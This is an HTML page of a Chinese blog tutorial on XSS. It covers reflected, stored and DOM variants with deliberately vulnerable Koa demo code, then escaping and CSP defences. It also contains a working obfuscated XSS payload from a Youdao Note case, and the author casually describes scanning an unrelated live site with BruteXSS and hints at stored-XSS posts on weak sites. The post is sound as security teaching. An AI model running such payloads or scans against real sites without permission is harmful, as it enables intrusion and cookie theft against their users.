@@ -1,0 +1,1073 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next mist" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-7371507374872885",
+    enable_page_level_ads: true
+  });
+</script>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="http,web-secure," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="在进入 web 安全知识之前，建议对 HTTP 有所了解，可以看HTTP 入门体检，会对以下的内容有所帮助。 XSS(Cross Site Scripting) XSS，跨站脚本攻击。很常见的一种攻击方式，主要是通过脚本注入的方式进行攻击用户。通常有：反射型 XSS 、存储型 XSS和 DOM 型 XSS。——跨站脚本 - 维基百科  反射型XSS 反射型 XSS，为非持久型，可以把它想象成反射弧">
+<meta name="keywords" content="http,web-secure">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web 安全防御战 - 浅谈XSS">
+<meta property="og:url" content="https://lucius0.github.io/2019/06/30//archivers/web-secure-xss/index.html">
+<meta property="og:site_name" content="Lucius&#39;s Blog">
+<meta property="og:description" content="在进入 web 安全知识之前，建议对 HTTP 有所了解，可以看HTTP 入门体检，会对以下的内容有所帮助。 XSS(Cross Site Scripting) XSS，跨站脚本攻击。很常见的一种攻击方式，主要是通过脚本注入的方式进行攻击用户。通常有：反射型 XSS 、存储型 XSS和 DOM 型 XSS。——跨站脚本 - 维基百科  反射型XSS 反射型 XSS，为非持久型，可以把它想象成反射弧">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://lucius0.github.io/images/http/xss-01.gif">
+<meta property="og:image" content="https://lucius0.github.io/images/http/xss-02.gif">
+<meta property="og:image" content="https://lucius0.github.io/images/http/xss-03.gif">
+<meta property="og:image" content="https://lucius0.github.io/images/http/xss-04.jpg">
+<meta property="og:image" content="https://lucius0.github.io/images/http/xss-05.png">
+<meta property="og:image" content="https://lucius0.github.io/images/http/xss-06.png">
+<meta property="og:updated_time" content="2019-07-04T15:29:01.107Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web 安全防御战 - 浅谈XSS">
+<meta name="twitter:description" content="在进入 web 安全知识之前，建议对 HTTP 有所了解，可以看HTTP 入门体检，会对以下的内容有所帮助。 XSS(Cross Site Scripting) XSS，跨站脚本攻击。很常见的一种攻击方式，主要是通过脚本注入的方式进行攻击用户。通常有：反射型 XSS 、存储型 XSS和 DOM 型 XSS。——跨站脚本 - 维基百科  反射型XSS 反射型 XSS，为非持久型，可以把它想象成反射弧">
+<meta name="twitter:image" content="https://lucius0.github.io/images/http/xss-01.gif">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://lucius0.github.io/2019/06/30//archivers/web-secure-xss/"/>
+
+
+
+
+
+  <title> Web 安全防御战 - 浅谈XSS | Lucius's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Lucius's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            日志
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="https://lucius0.github.io/2019/06/30/archivers/web-secure-xss/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="Lucius">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Lucius's Blog">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Lucius's Blog" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Web 安全防御战 - 浅谈XSS
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-30T00:00:00+08:00">
+                2019-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/http/" itemprop="url" rel="index">
+                    <span itemprop="name">http</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/http/web-secure/" itemprop="url" rel="index">
+                    <span itemprop="name">web-secure</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在进入 web 安全知识之前，建议对 HTTP 有所了解，可以看<a href="https://lucius0.github.io/2019/06/30/archivers/http-introduction/">HTTP 入门体检</a>，会对以下的内容有所帮助。</p>
+<h2 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS(Cross Site Scripting)"></a>XSS(Cross Site Scripting)</h2><blockquote>
+<p>XSS，跨站脚本攻击。很常见的一种攻击方式，主要是通过<strong>脚本注入</strong>的方式进行攻击用户。通常有：反射型 XSS 、存储型 XSS和 DOM 型 XSS。——<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科</a></p>
+</blockquote>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><blockquote>
+<p>反射型 XSS，为非持久型，可以把它想象成反射弧。从发起带有XSS脚本的请求，提交到服务端，服务端解析后响应随之返回浏览器，最后浏览器将其响应解析并执行。简单来说，一般都是由 URI 参数直接注入的攻击。</p>
+</blockquote>
+<p>我们用 Koa2 来模拟一下，以下是简单的示例代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`welcome: `</span> + ctx.query.xss);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></p>
+<p>在下面我们可以看到，浏览器会报错，原因是现代浏览器都会有 XSS 拦截的保护机制(这并不代表因为浏览器帮我们做了而我们就可以忽略 XSS 的知识)。</p>
+<p><img src="/images/http/xss-01.gif" alt=""></p>
+<p>因此我们需要在服务器设置响应首部<code>X-XSS-Protection</code>。由于我们是要模拟 XSS ，所以我们先关闭 XSS 的保护 <code>ctx.set(&#39;X-XSS-Protection&#39;, 0)</code>，然后就可以看到以下结果，弹出 alert 弹窗。</p>
+<p><img src="/images/http/xss-02.gif" alt=""></p>
+<p>除了上面直接执行脚本之外，还可以加载非同源的js文件，嵌入 iframe 页面等等。</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><blockquote>
+<p> 存储型 XSS，为持久型。跟反射型 XSS 的唯一区别在于是否会保存在服务器，如数据库，内存等。而当别人访问该页面时，就会受到 XSS 代码的攻击。危害相比反射型更加严重，也更隐匿。</p>
+</blockquote>
+<p>我们再次用Koa2来模拟一下，以下是简单的示例代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟数据库</span></span><br><span class="line"><span class="keyword">const</span> database = &#123;</span><br><span class="line">  message: <span class="string">''</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> url = ctx.request.url;</span><br><span class="line">  <span class="keyword">if</span> (url.indexOf(<span class="string">'/blog'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    database.message = ctx.query.message;</span><br><span class="line">    ctx.body = <span class="string">'发送成功～'</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.set(<span class="string">'X-XSS-Protection'</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`来自某某人的消息：`</span> + database.message);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
+<p>大概的步骤是模拟类博客那种，黑客利用漏洞向网站发送带有 XSS 攻击脚本到服务器，服务器没有任何的安全校验直接保存到数据库 <code>database</code>，当其他用户访问带有该 XSS 脚本的页面时就被攻击了。在这里我们发送一个带用 iframe 劫持的请求到服务器，用户收到响应时就会返回该 iframe 页面。</p>
+<p><img src="/images/http/xss-03.gif" alt=""></p>
+<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><blockquote>
+<p>DOM 型 XSS，为非持久型，主要是利用前端的代码逻辑漏洞，攻击者植入恶意代码，然后浏览器解析恶意代码后执行造成的 XSS 攻击。</p>
+</blockquote>
+<p>以下是简单的示例代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  DOM 型 XSS</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="string">'alert(1)'</span>);</span></span><br><span class="line"><span class="javascript">  setInterval(<span class="string">'alert(2)'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="built_in">eval</span>(<span class="string">'alert(3)'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="常见-XSS-注入点"><a href="#常见-XSS-注入点" class="headerlink" title="常见 XSS 注入点"></a>常见 XSS 注入点</h3><ul>
+<li>HTML 节点内容，例如动态生成，里面包含用户输入信息，那么有可能会携带脚本；</li>
+<li>HTML 节点属性，例如图片的 onerror、onclick 事件；超链接 href、输入框 value 属性；</li>
+<li>JavaScript 代码，例如 JS 代码中存在后台注入的变量或如 react 的 dangerouslySetInnerHTML；</li>
+<li>富文本，例如富文本需要过滤需要正常展示的 html 代码之外的脚本；</li>
+</ul>
+<h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul>
+<li>获取页面数据；</li>
+<li>盗取 Cookie，获取敏感信息；</li>
+<li>劫持前端逻辑；</li>
+<li>伪装身份，利用可信任来进行不允许的操作；</li>
+<li>进行 DDoS 攻击；</li>
+<li>……</li>
+</ul>
+<h3 id="常见防御方法"><a href="#常见防御方法" class="headerlink" title="常见防御方法"></a>常见防御方法</h3><ul>
+<li>浏览器自带防御，如我们上面提到的，假如在服务器不设置<code>X-XSS-Protection</code>，现代浏览器也一样会为我们拦截大部分的 XSS 攻击(<strong>反射型 XSS，而且只会拦截出现在 HTML 内容或属性中，同时也并不是所有浏览器都支持</strong>)；</li>
+<li>节点内容转义，一般会在入数据库之前转义或者在展示的时候转义，但是入库之前转义需要<strong>注意的是，1、客户端不仅仅只有Web端，也有iOS等终端，所以可能会导致出现乱码；2、转义后的字符串跟长度跟预期的字符串长度发生变化，如’&lt;‘ 转成 ‘&lt;’，由1个字符变成了4个字符</strong>；</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 展示转义简单处理</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#x27;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2F;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>JavaScript 内容转义，同理节点内容转义，但是处理方法稍微不同，可以使用<code>JSON.stringify</code>来处理；</li>
+<li>Angular / Vue / React，不建议使用 <code>[innerHTML]/v-html/dangerouslySetInnerHTML</code> 来插入 html 元素；</li>
+<li><code>eval()/setTimeout()/setInterval()</code>，都是可以直接将字符串当代码段运行；</li>
+<li>富文本内容转义，相对于节点内容转义跟 JavaScript 内容转义，富文本内容转义比较复杂，但是大多数处理的思路都是相同的，设置转义白名单，对用户输入的内容进行过滤，可以使用 <code>js-xss</code> 库；</li>
+<li>CSP(Content-Security-Policy)，可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a>，后续会说明下CSP策略；</li>
+</ul>
+<p>总体来说，我们能做的只是降低 XSS 攻击的风险，XSS 的攻防战一直存在也十分复杂。最后给一下<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>，祝大家看得开心（溜了～</p>
+<h2 id="实战-amp-amp-案例"><a href="#实战-amp-amp-案例" class="headerlink" title="实战 &amp;&amp; 案例"></a>实战 &amp;&amp; 案例</h2><p>是否你会存在这样的侥幸心理，看完上文后觉得只要进行转义就行了，是的，其实只要进行转义就行了，问题就是从<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>看出，过滤规则表还是蛮多的。我们来简单的实战一下。</p>
+<p>XSS 检测工具有很多，有<strong>BruteXSS</strong>，<strong>XSSer</strong>，<strong>Beef-XSS</strong>等等，可以说靠自己在本地扫描自己本地项目是否存在 XSS 漏洞了。我们在这里用<strong>BruteXSS</strong>来演示一下，<strong>仅做学习，切勿犯法。</strong></p>
+<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><blockquote>
+<p>BruteXSS 是一个根据暴力注入参数的跨站点脚本检测工具，不仅仅支持 GET 请求，还支持 POST 请求。它能从指定的词库中夹在多种 payload 进行注入，并且使用指定的 payload 和扫描检查这些存在的 XSS 漏洞的参数。</p>
+</blockquote>
+<p>我们从 github 下载<a href="https://github.com/Bosco-Lam/BruteXss" target="_blank" rel="noopener">BruteXSS</a>，之所以下载这个是因为它有 wordlist-huge.txt，也就是我们所说的 payload 词库，它约有5000条 payload 脚本。接着我们还需要安装 Python 2.7，<code>pip install colorama</code> 和 <code>pip install Mechanize</code>。</p>
+<p>执行 <code>python brutexss.py</code>，正常情况下会出现以下界面：</p>
+<p><img src="/images/http/xss-04.jpg" alt=""></p>
+<p>接着，搓搓期待的小手，我们可以到处学(sa)习(ye)了。找了好久好不容易才找到一个，于是我们就开始行动，具体的操作在这里就不讲解了，因为一步一步看操作，很简单。我们找的是使用 <code>GET</code> 方法，这类漏洞比较好找，只要对方有输入框即可(现在的浏览器以及网站多多少少都会防御部分XSS，所以不太好找)。</p>
+<p><img src="/images/http/xss-05.png" alt=""></p>
+<p>可以看到参数 <code>q</code> 有一个遗漏的注入点，于是我们就来试试看，是否真的成效。</p>
+<p><img src="/images/http/xss-06.png" alt=""></p>
+<p>(,,#ﾟДﾟ)，没想到居然成了，我试了好多几乎都被后台拦截了，这个居然成了(,,#ﾟДﾟ)。可以看出通过 payload 给出的攻击脚本能顺利的弹出 <code>1</code> 这个框。这个就是典型的<strong>反射型 XSS 攻击。</strong></p>
+<p>除此之外，我们还可以利用该工具在一些破破烂烂的边缘网站发帖来实现<strong>存储型 XSS攻击</strong>。但是这个工具也只是辅助工具，并不代表通过该工具扫描不出的就无漏洞，更多攻击者靠的可是<strong>技术以及经验。</strong></p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><blockquote>
+<p><a href="http://www.wooyun.org" target="_blank" rel="noopener">乌云</a>不在的第三个年头，想它。 ———— 鲁迅</p>
+</blockquote>
+<p>不仅仅是破破烂烂的边缘小网站，也有大公司也存在过 XSS 攻击的案例。</p>
+<h4 id="案例1-有道云笔记分享出现-XSS-攻击漏洞"><a href="#案例1-有道云笔记分享出现-XSS-攻击漏洞" class="headerlink" title="案例1 有道云笔记分享出现 XSS 攻击漏洞"></a>案例1 有道云笔记分享出现 XSS 攻击漏洞</h4><ol>
+<li>编辑完有道云笔记后保存然后通过<strong>Fiddler</strong>或<strong>Charles</strong>进行抓包；</li>
+<li>由于有道云在对 <code>iframe</code> 的 <code>srcdoc</code> 没做处理，因此可以利用这个弱点来进行注入 payload，然后分享给别人，payload 如下；</li>
+<li>修复的方法也很简单，就是对其针对 <code>iframe</code> 的 <code>srcdoc</code> 加强过滤就行了；</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#&lt;iframe class=&amp;quot;&amp;#x7a;&amp;#x68;&amp;#x6f;&amp;#x75;zhou&amp;quot; src='javAscript:confirm(1111)'/1111111wooyun/)"');' href=`vBscript:msgbox('"');` srcdoc='vBscr&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6e;&amp;#x29;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;ipt:msgbox('"');' alt=`</span><br><span class="line"></span><br><span class="line"><span class="string">` yuyangzhou="&lt;iframe" onclick=eval('&lt;script&gt;alert(/martinzhou/)&lt;/script&gt;'); style=&amp;quot;font-family:e/* &amp;#*/x/*&amp;#x0000000022;*/p/*&amp;gt;*/r/*onkeydown=*/ession(confirm(5));"iframe&gt;zhou&amp;quot;&gt;5&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">`&lt;div class=" \\'" src=&amp;nbsp;javAscript:confirm('1"');&amp;nbsp; href=`</span>data:q;base64,PHNjcmlwdD5hbGVydCgnQHFhYicpPC9zY3JpcHQ+<span class="string">` srcdoc= javAscript:confirm('1"');  alt="zhou" yuyangzhou=`</span><span class="string">`&lt;div/onmouseover=prompt(1)`</span> onload=alert(<span class="string">'1"'</span>); style=&amp;nbsp;font-family:e<span class="comment">/*;/*/</span>x<span class="comment">/*&amp;#34;*/</span>p<span class="comment">/*&amp;quot;*/</span>r<span class="comment">/*onclick=*/</span>ession(confirm(<span class="number">0</span>));<span class="string">""</span><span class="string">`&lt;div/onmouseover=prompt(1)&amp;nbsp;&gt;0&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="案例2-新浪微博反射型-XSS"><a href="#案例2-新浪微博反射型-XSS" class="headerlink" title="案例2 新浪微博反射型 XSS"></a>案例2 新浪微博反射型 XSS</h4><ol>
+<li>在新浪微博某个分享页，有这样的一个接口<code>http://book.weibo.com/newcms/i/weibo_send.php</code>；</li>
+<li><p>当错误时返回的数据结构为如下；</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 也就是说这个接口会校验`error.referer`</span></span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="number">-1</span>,<span class="string">"message"</span>:<span class="string">"\u8bf7\u6c42\u6e90\u4e0d\u5141\u8bb8[http:\/\/error.referer]"</span>&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当<code>error.referer</code>返回来后页面的响应报文为<code>Content-Type: text/html; charset=utf-8</code>，既然错误后的<code>Content-Type</code>为<code>text/html</code>，那么我们就可以在此做文章；</p>
+</li>
+<li>虽然在 Chrome 和 Firefox 下，referrer 都会被进行 url encode导致无法插入HTML标签。<strong>但是该问题，可以在 IE 进行 XSS 攻击；</strong></li>
+<li><p>我们在自己的服务器做一些处理，向我们服务器发起请求，即在浏览器地址栏输入如下 URL；</p>
